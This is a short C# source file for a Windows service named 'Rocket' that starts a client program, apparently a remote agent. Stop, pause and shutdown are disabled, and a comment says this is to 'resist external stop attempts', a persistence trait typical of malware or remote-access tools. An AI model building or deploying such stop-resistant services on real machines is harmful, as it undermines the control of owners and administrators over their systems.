using System.ServiceProcess;
using System.Threading;

namespace Client.Service
{
    internal class AgentService : ServiceBase
    {
        internal const string ServiceIdentifier = "Rocket";
        internal const string ServiceDisplayName = "Rocket";
        internal const string ServiceDescription = "Rocket Services";
        private CancellationTokenSource cancellation;

        public AgentService()
        {
            ServiceName = ServiceIdentifier;
            CanShutdown = false;
            CanStop = false;
            CanPauseAndContinue = false;
        }

        protected override void OnStart(string[] args)
        {
            cancellation = new CancellationTokenSource();
            Program.StartClient(cancellation.Token);
        }

        protected override void OnStop()
        {
            // Stop is intentionally disabled.
        }

        protected override void OnShutdown()
        {
            // Shutdown is intentionally ignored to resist external stop attempts.
        }
    }
}
